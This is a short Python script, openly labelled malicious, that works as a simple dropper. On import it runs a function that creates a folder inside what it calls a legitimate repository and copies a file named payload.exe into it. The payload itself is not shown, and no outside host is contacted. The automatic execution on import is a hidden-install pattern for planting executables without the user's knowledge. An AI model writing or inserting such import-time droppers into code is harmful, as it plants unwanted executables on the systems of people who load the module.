import os
import shutil

# Malicious function to execute payload
def execute_payload():
    victim_directory = 'D:/legitimate-repo/malicious_folder'
    if not os.path.exists(victim_directory):
        os.makedirs(victim_directory)

    # Example: Replicate files into the created folder
    shutil.copy("payload.exe", victim_directory)
    print(f"Malicious files copied to {victim_directory}")

# Optionally, call the payload execution automatically on import
execute_payload()
